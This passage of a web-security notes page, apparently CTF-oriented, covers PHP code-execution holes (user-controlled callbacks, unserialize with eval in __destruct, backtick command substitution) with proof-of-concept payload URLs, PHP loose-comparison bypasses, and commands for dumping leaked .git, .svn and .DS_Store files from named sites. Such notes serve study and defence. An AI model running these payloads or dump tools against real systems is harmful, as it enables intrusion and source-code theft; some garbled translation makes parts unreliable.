    <span class="nv">$var</span> <span class="o">=</span> <span class="s2">&quot;aaabbbccc</span><span class="si">${</span><span class="nv">`ls`</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="cp">?&gt;</span><span class="x"></span>
</code></pre></div>
<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
    <span class="nv">$foobar</span> <span class="o">=</span> <span class="s2">&quot;phpinfo&quot;</span><span class="p">;</span>
    <span class="err">$</span><span class="p">{</span><span class="s2">&quot;foobar&quot;</span><span class="p">}();</span>
<span class="cp">?&gt;</span><span class="x"></span>
</code></pre></div>
<h3 id="callback">Callback</h3>
<p>Many functions can execute callback functions, which will cause code execution when the callback function is
controllable by the user.</p>
<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
    <span class="nv">$evil_callback</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;callback&quot;</span><span class="p">];</span>
    <span class="nv">$some_array</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">);</span>
    <span class="nv">$new_array</span> <span class="o">=</span> <span class="nb">array_map</span><span class="p">(</span><span class="nv">$evil_callback</span><span class="p">,</span> <span class="nv">$some_array</span><span class="p">);</span>
<span class="cp">?&gt;</span><span class="x"></span>
</code></pre></div>
<p>Attack payload</p>
<div class="highlight"><pre><span></span><code>http://www.a.com/index.php?callback=phpinfo
</code></pre></div>
<h3 id="deserialization">Deserialization</h3>
<p>If <code>unserialize()</code> defines a <code>__destruct()</code> or <code>__wakeup()</code> function at execution time, it may cause code execution.</p>
<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
    <span class="k">class</span> <span class="nc">Example</span> <span class="p">{</span>
    <span class="nx">was</span> <span class="nv">$var</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
      <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span> <span class="p">{</span>
        <span class="k">eval</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">var</span><span class="p">);</span>
      <span class="p">}</span>
    <span class="p">}</span>
    <span class="nb">unserialize</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;saved_code&quot;</span><span class="p">]);</span>
<span class="cp">?&gt;</span><span class="x"></span>
</code></pre></div>
<p>Attack payload</p>
<div class="highlight"><pre><span></span><code>http://www.a.com/index.php?saved_code=O:7:&quot;Example&quot;:1:{s:3:&quot;var&quot;;s:10:&quot;phpinfo();&quot;;}
</code></pre></div>
<h2 id="php-features">PHP Features</h2>
<h3 id="array">Array</h3>
<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
    <span class="nv">$var</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="nv">$var</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
    <span class="nv">$var</span> <span class="o">=</span> <span class="s2">&quot;string&quot;</span><span class="p">;</span>
<span class="cp">?&gt;</span><span class="x"></span>
</code></pre></div>
<p>Php does not strictly check incoming variable types, nor can it convert types freely.</p>
<p>For example, in the comparison of <code>$a == $b</code></p>
<div class="highlight"><pre><span></span><code><span class="x">$a = null; </span>
<span class="x">$b = false; // is true</span>
<span class="x">$a = &#39;&#39;; </span>
<span class="x">$b = 0; //also true</span>
</code></pre></div>
<p>However, the developers of the PHP kernel originally wanted to let programmers develop more efficiently with this system
that does not require declarations, so many loosely used comparisons and transformations were used in almost all
built-in functions and basic structures to prevent programs from being used. The variables are frequently reported
incorrectly because of the programmer&#39;s irregularity, but this brings security problems.</p>
<div class="highlight"><pre><span></span><code><span class="x">0 == &#39;0&#39; //true</span>
<span class="x">0 == &#39;abcdefg&#39; //true</span>
<span class="x">0 === &#39;abcdefg&#39; //false</span>
<span class="x">1 == &#39;1abcdef&#39; //true</span>
</code></pre></div>
<h3 id="magic-hash">Magic Hash</h3>
<div class="highlight"><pre><span></span><code><span class="x">&quot;0e132456789&quot; == &quot;0e7124511451155&quot; //true</span>
<span class="x">&quot;0e123456abc&quot; == &quot;0e1dddada&quot; //false</span>
<span class="x">&quot;0e1abc&quot; == &quot;0&quot;  //true</span>
</code></pre></div>
<p>When a comparison operation is performed, if a string such as <code>0e\d+</code> is encountered, the string is parsed into
scientific notation. So the values of the two numbers in the above example are all 0 and thus equal. If the pattern of
<code>0e\d+</code> is not satisfied, it will not be equal.</p>
<h3 id="hex-conversion">Hex conversion</h3>
<div class="highlight"><pre><span></span><code><span class="x">&quot;0x1e240&quot; == &quot;123456&quot; //true</span>
<span class="x">&quot;0x1e240&quot; == 123456 //true</span>
<span class="x">&quot;0x1e240&quot; == &quot;1e240&quot; //false</span>
</code></pre></div>
<p>When one of the strings starts with <code>0x</code>, PHP parses the string into decimal and then compares it. <code>0x1240</code> parsing into
decimal is 123456, so with the <code>int</code> type and the <code>string</code> type of 123456 The comparisons are all equal.</p>
<h3 id="type-conversion">Type conversion</h3>
<p>The common conversions are mainly <code>int</code> converted to <code>string</code>, <code>string</code> converted to <code>int</code>.</p>
<p><code>int</code> turn <code>string</code></p>
<div class="highlight"><pre><span></span><code><span class="x">$var = 5;</span>
<span class="x">Method 1: $item = (string)$var;</span>
<span class="x">Method 2: $item = strval($var);</span>
</code></pre></div>
<p><code>string</code> turns <code>int</code>:<code>intval()</code> function.</p>
<p>For this function, you can look at 2 examples first.</p>
<div class="highlight"><pre><span></span><code><span class="x">var_dump(intval(&#39;2&#39;)) // 2</span>
<span class="x">var_dump(intval(&#39;3abcd&#39;)) // 3</span>
<span class="x">var_dump(intval(&#39;abcd&#39;)) // 0</span>
</code></pre></div>
<p>When the <code>intval()</code> conversion is specified, it will be converted from the beginning of the string to know that a
non-numeric character has been encountered. Even if there is a string that cannot be converted, <code>intval()</code> will not
report an error but return 0.</p>
<p>At the same time, programmers should not use the following code when programming:</p>
<div class="highlight"><pre><span></span><code><span class="x">if(intval($a)&gt;1000) {</span>
<span class="x">    mysql_query(&quot;select * from news where id=&quot;.$a)</span>
<span class="x">}</span>
</code></pre></div>
<p>At this time, the value of <code>$a</code> may be <code>1002 union</code>.</p>
<h3 id="looseness-of-parameters-of-built-in-functions">Looseness of parameters of built-in functions</h3>
<p>The looseness of the built-in function is that when the function is called, the function is passed to the function type
that the function cannot accept. Explain a bit of a mouthful, or directly through the actual examples to illustrate the
problem, the following will focus on a few of these functions.</p>
<h4 id="md5">md5()</h4>
<div class="highlight"><pre><span></span><code><span class="x">$array1[] = array(</span>
<span class="x">    &quot;foo&quot; =&gt; &quot;bar&quot;,</span>
<span class="x">    &quot;bar&quot; =&gt; &quot;foo&quot;,</span>
<span class="x">);</span>
<span class="x">$array2 = array(&quot;foo&quot;, &quot;bar&quot;, &quot;hello&quot;, &quot;world&quot;);</span>
<span class="x">var_dump(md5($array1) == md5($array2)); //threaten</span>
</code></pre></div>
<p>The description of the md5() function in the PHP manual is <code>string md5(string $str [, bool $raw_output = false ])</code>, and
the requirement in <code>md5()</code> is a string type parameter. But when you pass an array, <code>md5()</code> will not report an error, but
will not be able to correctly find the md5 value of the array, which will cause the md5 values of any 2 arrays to be
equal.</p>
<h4 id="strcmp">strcmp()</h4>
<p>The <code>strcmp()</code> function is described in the official PHP manual as <code>intstrcmp(string $str1 , string $str2)</code>, which needs
to pass 2 arguments of type <code>string</code> to <code>strcmp()</code>. If <code>str1</code> is less than <code>str2</code>, it returns -1, and equality returns
0, otherwise it returns 1. The essence of the <code>strcmp()</code> function to compare strings is to convert two variables to
ASCII, then perform the subtraction, and then determine the return value based on the result of the operation.</p>
<p>What if the argument that gives <code>strcmp()</code> is a number?</p>
<div class="highlight"><pre><span></span><code><span class="x">$array = [1,2,3];</span>
<span class="x">var_dump(strcmp($array, &#39;123&#39;)); //null, in a sense null is equivalent to false.</span>
</code></pre></div>
<h4 id="switch">switch()</h4>
<p>If <code>switch()</code> is a case of a numeric type, switch will convert the parameters to an int. as follows:</p>
<div class="highlight"><pre><span></span><code><span class="x">$i = &quot;2abc&quot;;</span>
<span class="x">switch($i) {</span>
<span class="x">    case 0:</span>
<span class="x">    case 1:</span>
<span class="x">    case 2:</span>
<span class="x">        echo &quot;i is less than 3 but not negative&quot;;</span>
<span class="x">        break;</span>
<span class="x">    case 3:</span>
<span class="x">        echo &quot;i is 3&quot;;</span>
<span class="x">}</span>
</code></pre></div>
<p>At this time, the program outputs <code>i is less than 3 but not negative</code> because the <code>switch()</code> function converts <code>$i</code> and
the result is 2.</p>
<h4 id="in_array">in_array()</h4>
<p>In the PHP manual, the <code>in_array()</code> function is interpreted as
<code>bool in_array(mixed $needle , array $haystack [, bool $strict = FALSE ])</code> . If the strict parameter is not provided,
then <code>in_array</code> will be loose. Compare to see if <code>$needle</code> is in <code>$haystack</code>. When the value of strict is true,
<code>in_array()</code> compares the type of needls with the type in haystack.</p>
<div class="highlight"><pre><span></span><code><span class="x">$array = [0, 1, 2, &#39;3&#39;];</span>
<span class="x">var_dump(in_array(&#39;abc&#39;, $array)); //true</span>
<span class="x">var_dump(in_array(&#39;1bc&#39;, $array)); //true</span>
</code></pre></div>
<p>You can see that the above case returns true, because <code>'abc'</code> will be converted to 0, and <code>'1bc'</code> will be converted to
1.</p>
<p><code>array_search()</code> is the same as <code>in_array()</code>.</p>
<h2 id="looking-for-source-code-backup">Looking for source code backup</h2>
<h3 id="hg-source-code-leak">hg Source code leak</h3>
<p><code>hg</code> files are generated when <code>hg init</code>.</p>
<p><a href="https://github.com/kost/dvcs-ripper">Using the tool dvcs-ripper</a></p>
<h3 id="git-source-leaks">Git Source leaks</h3>
<p>The <code>.git</code> directory contains files such as code change records. If the files in this directory are accessible when
deployed, they may be used to restore the source code.</p>
<div class="highlight"><pre><span></span><code>/.git
/.git/HEAD
/.git/index
/.git/config
/.git/description
</code></pre></div>
<p><a href="https://github.com/lijiejie/GitHack">GitHack</a></p>
<div class="highlight"><pre><span></span><code>python GitHack.py http://www.openssl.org/.git/
</code></pre></div>
<p><a href="https://github.com/WangYihang/GitHacker">GitHacker (Recoverable Full Git Repository)</a></p>
<div class="highlight"><pre><span></span><code>python GitHacker.py http://www.openssl.org/.git/
</code></pre></div>
<h3 id="ds_store-file-leaked"><code>.DS_Store</code> File leaked</h3>
<p>Mac OS will contain a <code>.DS_Store</code> file containing information such as the file name.</p>
<p><a href="https://github.com/lijiejie/ds_store_exp">Using the tool ds_store_exp</a></p>
<div class="highlight"><pre><span></span><code>python ds_store_exp.py http://hd.zj.qq.com/themes/galaxyw/.DS_Store

hd.zj.qq.com/
└── themes
    └── galaxyw
        ├── app
        │   └── css
        │       └── style.min.css
        ├── cityData.min.js
        ├── images
        │   └── img
        │       ├── bg-hd.png
        │       ├── bg-item-activity.png
        │       ├── bg-masker-pop.png
        │       ├── btn-bm.png
        │       ├── btn-login-qq.png
        │       ├── btn-login-wx.png
        │       ├── ico-add-pic.png
        │       ├── ico-address.png
        │       ├── ico-bm.png
        │       ├── ico-duration-time.png
        │       ├── ico-pop-close.png
        │       ├── ico-right-top-delete.png
        │       ├── page-login-hd.png
        │       ├── pic-masker.png
        │       └── ticket-selected.png
        └── member
            ├── assets
            │   ├── css
            │   │   ├── ace-reset.css
            │   │   └── antd.css
            │   └── lib
            │       ├── cityData.min.js
            │       └── ueditor
            │           ├── index.html
            │           ├── lang
            │           │   └── zh-cn
            │           │       ├── images
            │           │       │   ├── copy.png
            │           │       │   ├── localimage.png
            │           │       │   ├── music.png
            │           │       │   └── upload.png
            │           │       └── zh-cn.js
            │           ├── php
            │           │   ├── action_crawler.php
            │           │   ├── action_list.php
            │           │   ├── action_upload.php
            │           │   ├── config.json
            │           │   ├── controller.php
            │           │   └── Uploader.class.php
            │           ├── ueditor.all.js
            │           ├── ueditor.all.min.js
            │           ├── ueditor.config.js
            │           ├── ueditor.parse.js
            │           └── ueditor.parse.min.js
            └── static
                ├── css
                │   └── page.css
                ├── img
                │   ├── bg-table-title.png
                │   ├── bg-tab-say.png
                │   ├── ico-black-disabled.png
                │   ├── ico-black-enabled.png
                │   ├── ico-coorption-person.png
                │   ├── ico-miss-person.png
                │   ├── ico-mr-person.png
                │   ├── ico-white-disabled.png
                │   └── ico-white-enabled.png
                └── scripts
                    ├── js
                    └── lib
                        └── jquery.min.js

<span class="m">21</span> directories, <span class="m">48</span> files
</code></pre></div>
<h3 id="website-backup-file">Website backup file</h3>
<p>The administrator incorrectly placed the backup under the web directory after backing up the website file.</p>
<p>Common suffixes:</p>
<div class="highlight"><pre><span></span><code>.rar
.zip
.7z
.tar
.tar.gz
.behind
.txt
</code></pre></div>
<h3 id="svn-leak">SVN Leak</h3>
<p>Sensitive documents:</p>
<div class="highlight"><pre><span></span><code>/.svn
/.svn/wc.db
/.svn/entries
</code></pre></div>
<p><a href="https://github.com/kost/dvcs-ripper">dvcs-ripper</a></p>
<div class="highlight"><pre><span></span><code>perl rip-svn.pl -v -u http://www.example.com/.svn/
</code></pre></div>
<p><a href="http://tools.40huo.cn/#!web.md# source leak">Seay - SVN</a></p>
<h3 id="web-inf-webxml-leaked">WEB-INF / web.xml leaked</h3>
<p>WEB-INF is a secure directory for Java web applications, and there are file mappings in web.xml.</p>
<p>WEB-INF mainly contains the following files or directories:</p>
<ul>
<li><code>/WEB-INF/web.xml</code> : Web application configuration file that describes the servlet and other application component
  configuration and naming rules.</li>
<li><code>/WEB-INF/classes/</code> : Contains all the class files used by the site, including servlet class and non-servlet class,
  they cannot be included. In the jar file.</li>
<li><code>/WEB-INF/lib/</code> : Stores various jar files required by the web application, and places jar files that are only
  required in this application, such as database driver jar files.</li>
<li><code>/WEB-INF/src/</code> : source directory, each java file is placed according to the package name structure.</li>
<li><code>/WEB-INF/database.properties</code> : Database configuration file.</li>
</ul>
<p>By finding the web.xml file, inferring the path to the class file, and finally by directly classifying the file, the
website source code is obtained by decompiling the class file. In general, the jsp engine is forbidden to access the
WEB-INF directory by default. When Nginx works with Tomcat to balance load or cluster, the cause of the problem is
actually very simple. Nginx will not consider configuring other type engines (Nginx is not a jsp engine). The security
issue is introduced into its own security specification (so that the coupling is too high), modifying the Nginx
configuration file to block access to the WEB-INF directory is fine:</p>
<div class="highlight"><pre><span></span><code><span class="k">Location</span> <span class="p">~</span> <span class="sr">^/WEB-INF/*</span> <span class="p">{</span> <span class="kn">deny</span> <span class="s">all</span><span class="p">;</span> <span class="p">}</span> <span class="c1"># or return 404; or other!</span>
</code></pre></div>
<h3 id="cvs-leak">CVS Leak</h3>
<div class="highlight"><pre><span></span><code>http://url/CVS/Root returns the root information
http://url/CVS/Entries returns the structure of all files
</code></pre></div>
<p>Retrieve source code</p>
<div class="highlight"><pre><span></span><code>bk clone http://url/name dir
</code></pre></div>
<h3 id="references">References</h3>
<ul>
<li><a href="https://www.cnblogs.com/ECJTUACM-873284962/p/9433641.html">Remember the pit that the webshell stepped on (how to write a backdoor that does not contain numbers and letters in PHP)</a></li>
</ul>
                
                  
                
              
              
                


              
            </article>
          </div>
        </div>
      </main>
      
        
<footer class="md-footer">
  
    <div class="md-footer-nav">
      <nav class="md-footer-nav__inner md-grid" aria-label="Footer">
        
          <a href="../introduction" class="md-footer-nav__link md-footer-nav__link--prev" rel="prev">
            <div class="md-footer-nav__button md-icon">
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
            </div>
            <div class="md-footer-nav__title">
              <div class="md-ellipsis">
                <span class="md-footer-nav__direction">
                  Previous
                </span>
                Introduction
              </div>
            </div>
          </a>
        
        
          <a href="../sqli" class="md-footer-nav__link md-footer-nav__link--next" rel="next">
            <div class="md-footer-nav__title">
              <div class="md-ellipsis">
                <span class="md-footer-nav__direction">
                  Next
                </span>
                Sqli
              </div>
            </div>
            <div class="md-footer-nav__button md-icon">
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"/></svg>
            </div>
          </a>
        
      </nav>
    </div>
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-footer-copyright">
        
          <div class="md-footer-copyright__highlight">
            Copyright &copy; 2021 Illia Novak
          </div>
        
        Made with
        <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
          Material for MkDocs
        </a>
      </div>
      
  <div class="md-footer-social">
    
      
      
        
        
      
      <a href="https://github.com/anakilivo" target="_blank" rel="noopener" title="github.com" class="md-footer-social__link">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
      </a>
    
      
      
        
        
      
      <a href="https://www.linkedin.com/in/illia-novak/" target="_blank" rel="noopener" title="www.linkedin.com" class="md-footer-social__link">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg>
      </a>
    
      
      
      <a href="mailto:anakilivo@gmail.com" target="_blank" rel="noopener" title="" class="md-footer-social__link">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path d="M476 3.2L12.5 270.6c-18.1 10.4-15.8 35.6 2.2 43.2L121 358.4l287.3-253.2c5.5-4.9 13.3 2.6 8.6 8.3L176 407v80.5c0 23.6 28.5 32.9 42.5 15.8L282 426l124.6 52.2c14.2 6 30.4-2.9 33-18.2l72-432C515 7.8 493.3-6.8 476 3.2z"/></svg>
      </a>
    
  </div>

    </div>
  </div>
</footer>
      
    </div>
    
      <script src="../../assets/javascripts/vendor.53cc9318.min.js"></script>
      <script src="../../assets/javascripts/bundle.e9c9f54f.min.js"></script><script id="__lang" type="application/json">{"clipboard.copy": "Copy to clipboard", "clipboard.copied": "Copied to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.placeholder": "Type to start searching", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.term.missing": "Missing"}</script>
      
      <script>
        app = initialize({
          base: "../..",
          features: [],
          search: Object.assign({
            worker: "../../assets/javascripts/worker/search.9c0e82ba.min.js"
          }, typeof search !== "undefined" && search)
        })
      </script>
      
        <script src="../../javascripts/config.js"></script>
      
        <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
      
        <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
      
    
  </body>
</html>